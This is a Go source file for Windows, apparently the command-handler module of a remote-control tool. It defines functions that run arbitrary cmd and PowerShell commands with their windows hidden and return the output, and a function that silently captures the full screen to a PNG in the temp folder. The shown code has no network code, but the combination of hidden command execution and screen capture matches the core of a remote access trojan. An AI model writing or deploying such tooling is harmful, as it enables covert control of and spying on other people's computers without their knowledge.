package handlers

import (
	"context"
	"fmt"
	"image"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	CommandTimeout = 15 * time.Second
)

var (
	user32GDI = windows.NewLazySystemDLL("user32.dll")
	gdi32     = windows.NewLazySystemDLL("gdi32.dll")

	getSystemMetrics       = user32GDI.NewProc("GetSystemMetrics")
	getDC                  = user32GDI.NewProc("GetDC")
	releaseDC              = user32GDI.NewProc("ReleaseDC")
	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	selectObject           = gdi32.NewProc("SelectObject")
	bitBlt                 = gdi32.NewProc("BitBlt")
	getDIBits              = gdi32.NewProc("GetDIBits")
	deleteDC               = gdi32.NewProc("DeleteDC")
	deleteObject           = gdi32.NewProc("DeleteObject")
)

const (
	SM_CXSCREEN    = 0
	SM_CYSCREEN    = 1
	SRCCOPY        = 0x00CC0020
	BI_RGB         = 0
	DIB_RGB_COLORS = 0
)

type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

type BITMAPINFO struct {
	BmiHeader BITMAPINFOHEADER
	BmiColors [1]uint32
}

type SystemManager struct{}

func NewSystemManager() *SystemManager {
	return &SystemManager{}
}

func (sm *SystemManager) ExecuteCMD(ctx context.Context, command string) string {
	ctx, cancel := context.WithTimeout(ctx, CommandTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "cmd", "/C", command)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()

	result := string(output)
	if err != nil && result == "" {
		result = fmt.Sprintf("Error: %v", err)
	}
	if len(result) > 4000 {
		result = result[:4000] + "\n... [truncated]"
	}

	return result
}

func (sm *SystemManager) ExecutePowerShell(ctx context.Context, command string) string {
	ctx, cancel := context.WithTimeout(ctx, CommandTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()

	result := string(output)
	if err != nil && result == "" {
		result = fmt.Sprintf("Error: %v", err)
	}

	if len(result) > 4000 {
		result = result[:4000] + "\n... [truncated]"
	}

	return result
}

func (sm *SystemManager) TakeScreenshot() (string, error) {
	width, _, _ := getSystemMetrics.Call(SM_CXSCREEN)
	height, _, _ := getSystemMetrics.Call(SM_CYSCREEN)

	if width == 0 || height == 0 {
		return "", fmt.Errorf("no active displays found")
	}

	hdcScreen, _, _ := getDC.Call(0)
	if hdcScreen == 0 {
		return "", fmt.Errorf("failed to get screen DC")
	}
	defer releaseDC.Call(0, hdcScreen)

	hdcMem, _, _ := createCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return "", fmt.Errorf("failed to create compatible DC")
	}
	defer deleteDC.Call(hdcMem)

	hBitmap, _, _ := createCompatibleBitmap.Call(hdcScreen, width, height)
	if hBitmap == 0 {
		return "", fmt.Errorf("failed to create compatible bitmap")
	}
	defer deleteObject.Call(hBitmap)

	selectObject.Call(hdcMem, hBitmap)

	bitBlt.Call(
		hdcMem,
		0, 0,
		width, height,
		hdcScreen,
		0, 0,
		SRCCOPY,
	)

	var bi BITMAPINFO
	bi.BmiHeader.BiSize = uint32(unsafe.Sizeof(bi.BmiHeader))
	bi.BmiHeader.BiWidth = int32(width)
	bi.BmiHeader.BiHeight = -int32(height) 
	bi.BmiHeader.BiPlanes = 1
	bi.BmiHeader.BiBitCount = 32
	bi.BmiHeader.BiCompression = BI_RGB

	bufferSize := int(width) * int(height) * 4
	buffer := make([]byte, bufferSize)

	ret, _, _ := getDIBits.Call(
		hdcMem,
		hBitmap,
		0,
		height,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(unsafe.Pointer(&bi)),
		DIB_RGB_COLORS,
	)

	if ret == 0 {
		return "", fmt.Errorf("failed to get bitmap bits")
	}

	// BGRA --> RGBA
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			i := (y*int(width) + x) * 4
			img.Pix[i] = buffer[i+2]   // R
			img.Pix[i+1] = buffer[i+1] // G
			img.Pix[i+2] = buffer[i]   // B
			img.Pix[i+3] = buffer[i+3] // A
		}
	}

	filePath := filepath.Join(os.TempDir(), fmt.Sprintf("sc_%d.png", time.Now().Unix()))
	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	if err := png.Encode(file, img); err != nil {
		os.Remove(filePath)
		return "", err
	}

	return filePath, nil
}
